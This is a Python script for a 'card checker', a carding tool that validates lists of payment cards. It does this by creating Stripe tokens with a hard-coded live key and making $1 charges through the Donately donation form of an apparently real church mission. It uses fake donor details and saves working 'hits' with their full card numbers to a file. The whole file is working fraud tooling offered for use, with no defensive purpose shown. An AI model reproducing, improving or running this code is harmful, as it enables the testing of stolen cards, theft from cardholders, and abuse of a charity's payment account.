"""
Pydroid Card Checker - MULTI-THREADED VERSION
Stripe/Donately Gateway - Faster checking with threading
Format: cc|mm|yy|cvv (one per line)
"""

import requests
import json
import random
import string
import hashlib
import time
import os
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Thread-safe print lock
print_lock = threading.Lock()
file_lock = threading.Lock()


class StripeChecker:
    def __init__(self):
        self.pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        self.account_id = 'act_f9b102ae7299'
        self.form_id = 'frm_5cb29a5d6955'

    def generate_guid(self):
        return '-'.join([
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(3)),
            ''.join(random.choices(string.hexdigits[:16], k=3)) + '4',
            ''.join(random.choices(string.hexdigits[:16], k=3)) + 'a',
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(2))
        ])

    def generate_token(self, card_data):
        url = 'https://api.stripe.com/v1/tokens'
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        post_fields = {
            'card[number]': card_data['cc'],
            'card[cvc]': card_data['cvv'],
            'card[exp_month]': card_data['month'],
            'card[exp_year]': card_data['year'],
            'card[name]': card_data['name'],
            'card[address_country]': 'US',
            'card[currency]': 'USD',
            'guid': self.generate_guid(),
            'muid': self.generate_guid(),
            'sid': self.generate_guid(),
            'payment_user_agent': 'stripe.js/d72854d2f1; stripe-js-v3/d72854d2f1; card-element',
            'time_on_page': random.randint(20000, 50000),
            'key': self.pk_live,
            '_stripe_version': '2022-11-15'
        }

        try:
            response = requests.post(url, headers=headers, data=post_fields, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': {'message': str(e)}}

    def charge_card(self, token, user_data):
        url = f"https://api.donately.com/v2/donations?account_id={self.account_id}&donation_type=cc&amount_in_cents=100&form_id={self.form_id}&x1={hashlib.md5(str(time.time()).encode()).hexdigest()}"
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Donately-Version': '2022-12-15',
            'Origin': 'https://www-christwaymission-com.filesusr.com',
            'Referer': 'https://www-christwaymission-com.filesusr.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        payload = {
            'campaign_id': None,
            'fundraiser_id': None,
            'dont_send_receipt_email': False,
            'first_name': user_data['first_name'],
            'last_name': user_data['last_name'],
            'email': user_data['email'],
            'currency': 'USD',
            'recurring': False,
            'country': 'US',
            'payment_auth': json.dumps({'stripe_token': token}),
            'form': json.dumps({
                'version': '5.8.117',
                'id': self.form_id
            })
        }

        try:
            response = requests.post(url, headers=headers, json=payload, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': str(e)}

    def process_card(self, cc, month, year, cvv):
        user_data = {
            'first_name': 'Richard',
            'last_name': 'Biven',
            'email': f'test{random.randint(1000, 9999)}@gmail.com'
        }

        token_response = self.generate_token({
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv,
            'name': f"{user_data['first_name']} {user_data['last_name']}"
        })

        if 'id' not in token_response:
            error_msg = token_response.get('error', {}).get('message', 'Unknown error')
            return {
                'success': False,
                'status': 'TOKEN_ERROR',
                'message': error_msg
            }

        charge_response = self.charge_card(token_response['id'], user_data)
        return charge_response


def extract_card(text):
    """Extract card details from text in format: cc|mm|yy|cvv"""
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text.strip())
    if match:
        return match.groups()
    return None


def get_status(response):
    """Determine card status from response"""
    response_str = json.dumps(response).upper()
    
    if any(keyword in response_str for keyword in ['DONATION', 'RECEIPT', 'THANK YOU', 'SUCCESS', 'COMPLETED']):
        return 'CHARGED'
    
    if any(keyword in response_str for keyword in [
        'INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS',
        'INVALID_CVC', 'INCORRECT_CVC', 'CVC_CHECK',
        '3D_SECURE', '3DS', 'AUTHENTICATION',
        'DO_NOT_HONOR', 'CARD_DECLINED',
        'LOST_CARD', 'STOLEN_CARD',
        'EXPIRED_CARD', 'PROCESSING_ERROR',
        'RISK', 'FRAUD', 'RESTRICTED'
    ]):
        return 'APPROVED'
    
    if any(keyword in response_str for keyword in [
        'INVALID_NUMBER', 'INCORRECT_NUMBER',
        'INVALID_EXPIRY', 'INVALID_CARD',
        'CARD_NOT_SUPPORTED', 'TOKEN_ERROR',
        'ERROR', 'DECLINED', 'FAILED'
    ]):
        return 'DECLINED'
    
    return 'UNKNOWN'


def format_response(response):
    """Format response message"""
    if isinstance(response, dict):
        if 'error' in response:
            err = response.get('error', {})
            if isinstance(err, dict):
                return err.get('message', str(err))
            return str(err)
        if 'message' in response:
            return response['message']
        if 'status' in response:
            return response['status']
    return str(response)[:100]


def load_cards(file_path):
    """Load cards from txt file"""
    cards = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line and not line.startswith('#'):
                    extracted = extract_card(line)
                    if extracted:
                        cards.append(extracted)
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
    except Exception as e:
        print(f"[!] Error reading file: {e}")
    return cards


def save_result(file_path, card_str, response_msg):
    """Save result to file (thread-safe)"""
    with file_lock:
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"{card_str} | {response_msg}\n")
        except Exception as e:
            print(f"[!] Error saving to {file_path}: {e}")


def safe_print(*args, **kwargs):
    """Thread-safe print"""
    with print_lock:
        print(*args, **kwargs)


def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    """Print banner"""
    banner = """
╔═══════════════════════════════════════════════════╗
║   PYDROID CARD CHECKER - MULTI-THREADED v1.0      ║
║              Stripe/Donately Gateway              ║
╠═══════════════════════════════════════════════════╣
║  Gateway: Donately $1 Charge                      ║
║  Format: cc|mm|yy|cvv                             ║
╚═══════════════════════════════════════════════════╝
"""
    print(banner)


# Global stats (thread-safe)
stats = {
    'total': 0,
    'processed': 0,
    'charged': 0,
    'approved': 0,
    'declined': 0,
    'errors': 0
}
stats_lock = threading.Lock()


def check_single_card(card_data, checker, idx, hits_file, declined_file):
    """Check a single card - called by thread"""
    cc, month, year, cvv = card_data
    card_str = f"{cc}|{month}|{year}|{cvv}"
    masked_cc = f"{cc[:6]}******{cc[-4:]}"
    
    try:
        result = checker.process_card(cc, month, year, cvv)
        status = get_status(result)
        response_msg = format_response(result)
        
        with stats_lock:
            stats['processed'] += 1
            current = stats['processed']
        
        if status == 'CHARGED':
            with stats_lock:
                stats['charged'] += 1
            safe_print(f"[{current}/{stats['total']}] CHARGED  - {masked_cc} | {response_msg}")
            save_result(hits_file, card_str, f"CHARGED | {response_msg}")
            
        elif status == 'APPROVED':
            with stats_lock:
                stats['approved'] += 1
            safe_print(f"[{current}/{stats['total']}] APPROVED - {masked_cc} | {response_msg}")
            save_result(hits_file, card_str, f"APPROVED | {response_msg}")
            
        elif status == 'DECLINED':
            with stats_lock:
                stats['declined'] += 1
            safe_print(f"[{current}/{stats['total']}] DECLINED - {masked_cc} | {response_msg}")
            save_result(declined_file, card_str, response_msg)
            
        else:
            with stats_lock:
                stats['errors'] += 1
            safe_print(f"[{current}/{stats['total']}] UNKNOWN  - {masked_cc} | {response_msg}")
            save_result(declined_file, card_str, f"UNKNOWN | {response_msg}")
            
        return status
        
    except Exception as e:
        with stats_lock:
            stats['processed'] += 1
            stats['errors'] += 1
        safe_print(f"[{stats['processed']}/{stats['total']}] ERROR    - {masked_cc} | {str(e)}")
        save_result(declined_file, card_str, f"ERROR | {str(e)}")
        return 'ERROR'


def main():
    global stats
    
    clear_screen()
    print_banner()
    
    # Configuration
    INPUT_FILE = 'cards.txt'       # Input file with cards
    HITS_FILE = 'hits.txt'         # Charged/Approved cards
    DECLINED_FILE = 'declined.txt' # Declined cards
    THREADS = 3                    # Number of concurrent threads (don't set too high)
    
    print(f"[*] Input File  : {INPUT_FILE}")
    print(f"[*] Hits File   : {HITS_FILE}")
    print(f"[*] Declined    : {DECLINED_FILE}")
    print(f"[*] Threads     : {THREADS}")
    print("=" * 55)
    
    # Load cards
    cards = load_cards(INPUT_FILE)
    
    if not cards:
        print(f"\n[!] No valid cards found in {INPUT_FILE}")
        print("[!] Make sure the file exists and contains cards in format:")
        print("[!] 4111111111111111|12|25|123")
        return
    
    stats['total'] = len(cards)
    print(f"\n[+] Loaded {len(cards)} cards")
    print("[+] Starting multi-threaded checker...\n")
    print("=" * 55)
    
    checker = StripeChecker()
    start_time = time.time()
    
    # Use ThreadPoolExecutor for concurrent checking
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        for idx, card_data in enumerate(cards, 1):
            future = executor.submit(
                check_single_card, 
                card_data, 
                checker, 
                idx, 
                HITS_FILE, 
                DECLINED_FILE
            )
            futures.append(future)
            # Small delay to prevent overwhelming the API
            time.sleep(0.5)
        
        # Wait for all to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                safe_print(f"[!] Thread error: {e}")
    
    elapsed = round(time.time() - start_time, 2)
    
    # Print summary
    print("\n" + "=" * 55)
    print("                  SUMMARY")
    print("=" * 55)
    print(f"[*] Total Cards  : {stats['total']}")
    print(f"[+] Charged      : {stats['charged']}")
    print(f"[~] Approved     : {stats['approved']}")
    print(f"[-] Declined     : {stats['declined']}")
    print(f"[!] Errors       : {stats['errors']}")
    print(f"[*] Time Taken   : {elapsed}s")
    print("=" * 55)
    
    if stats['charged'] > 0 or stats['approved'] > 0:
        print(f"\n[+] Hits saved to: {HITS_FILE}")
    print(f"[-] Declined saved to: {DECLINED_FILE}")
    print("\n[*] Multi-threaded checker completed!")


if __name__ == "__main__":
    main()
